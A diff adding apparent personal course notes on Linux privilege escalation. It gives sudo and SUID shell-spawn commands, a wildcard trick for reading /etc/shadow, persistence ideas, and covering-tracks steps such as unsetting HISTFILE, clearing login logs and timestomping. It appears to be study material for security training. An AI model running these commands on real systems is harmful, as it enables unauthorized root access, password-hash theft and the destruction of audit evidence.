@@ -715,13 +715,68 @@
   -Event Viewer Application
     a.  Event viewer > click logs > Create a custom filte> Look at details
   -Create Custom Views top right
+  -Make sure you are looking at the right log
 
   ### Audit Logging
   -Run: auditpol /get /category:* | findst /i "success failure"
   - THIS COMMAND REQUIRES PERMISSIONS
 
  
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Day 9: Linux Exploitation/Escalation
+
+  ## Privelege Escalation:
+
+   ### Sudo- run: sudo -l to see current permissions on user
+
+   1.-sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+   2. After runing sudo -l, If a file has asterix at the end of it permissions file  
+        -a. sudo cat <filepath>* /etc/shadow
+
     
+   ### SUID
+    -find / -type f -perm /4000 -ls 2>/dev/null
+       -visit gtfobins.github.io/gtfobins/*NAMEOFBINARY*
+
+    -Follow steps on webpage- Example: ./*nameofbinary* /bin/sh -p
+
+  ### SGUID 
+    -find / -type f -perm /2000 -ls 2>/dev/null
+
+  ### Dot "." in PATH
 
 
-      
+  ## Persistence
+    -Crontab
+    -Add /hijack user account
+
+  ## Covering your tracks
+    -unset HISTFILE
+    -Figure out Init Type
+      a. ls -latr /proc/1exe
+      b.stat /sbin/init
+      c.man init
+      d.init --version
+      e.ps 1
+
+    -Logs for covering tracks in /var/log:
+      a. auth.log/secure
+      b.lastlog
+      c.btmp
+      d.sulog
+      e.utmp
+      f.wtmp
+      g. Make sure you timestomp log: touch -c -t
